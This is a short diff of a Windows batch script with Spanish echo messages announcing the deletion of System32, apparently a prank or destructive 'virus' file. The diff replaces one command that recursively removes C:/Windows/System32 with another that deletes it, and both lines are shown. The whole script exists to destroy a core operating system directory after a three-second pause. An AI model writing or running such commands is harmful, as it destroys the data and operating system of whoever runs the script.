@@ -3,4 +3,4 @@ echo Estas apunto de eliminar el System32
 echo Empezando ah eliminar...
 SLEEP 3
 
-rd /s /q C:/Windows/System32
+Del C:/Windows/System32
